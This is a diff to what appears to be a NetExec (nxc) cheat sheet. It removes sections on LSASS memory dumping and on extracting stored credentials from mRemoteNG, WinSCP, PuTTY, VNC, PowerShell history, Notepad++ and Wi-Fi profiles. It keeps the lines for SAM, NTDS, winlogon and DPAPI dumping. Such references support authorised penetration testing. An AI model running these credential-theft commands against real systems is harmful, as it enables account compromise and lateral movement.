@@ -37,21 +37,6 @@ nxc smb <target_ip> -u <user> -p <password> --sam
 nxc smb <dc_ip> -u <user> -p <password> --ntds
 ```
 
----
-
-#### LSASS and Memory Extraction
-
-- `--lsassy`: Extracts credentials from LSASS memory using LSASSASSY technique.
-
-```bash
-nxc smb <target_ip> -u <user> -p <password> --lsassy
-```
-
-- `--nanodump`: Dumps LSASS memory using the nanodump method for offline parsing.
-
-```bash
-nxc smb <target_ip> -u <user> -p <password> --nanodump
-```
 
 ---
 
@@ -68,58 +53,6 @@ nxc smb <target_ip> -u <user> -p <password> --winlogon
 ```bash
 nxc smb <target_ip> -u <user> -p <password> --dpapi
 ```
-
----
-
-#### Application Credentials
-
-- `--mremoteng`: Extracts stored credentials from mRemoteNG configuration files.
-
-```bash
-nxc smb <target_ip> -u <user> -p <password> --mremoteng
-```
-
-- `--winscp`: Extracts stored credentials from WinSCP configuration files.
-
-```bash
-nxc smb <target_ip> -u <user> -p <password> --winscp
-```
-
-- `--putty`: Retrieves PuTTY private key files.
-
-```bash
-nxc smb <target_ip> -u <user> -p <password> --putty
-```
-
-- `--vnc`: Dumps stored VNC passwords.
-
-```bash
-nxc smb <target_ip> -u <user> -p <password> --vnc
-```
-
----
-
-#### User Artifacts
-
-- `--powershell-history`: Retrieves PowerShell command history from user profiles.
-
-```bash
-nxc smb <target_ip> -u <user> -p <password> --powershell-history
-```
-
-- `--notepadpp`: Extracts Notepad++ session logs (may contain sensitive data).
-
-```bash
-nxc smb <target_ip> -u <user> -p <password> --notepadpp
-```
-
-- `--wifi`: Extracts saved Wi‑Fi profiles and pre‑shared keys.
-
-```bash
-nxc smb <target_ip> -u <user> -p <password> --wifi
-```
-
-
 
 
 ---
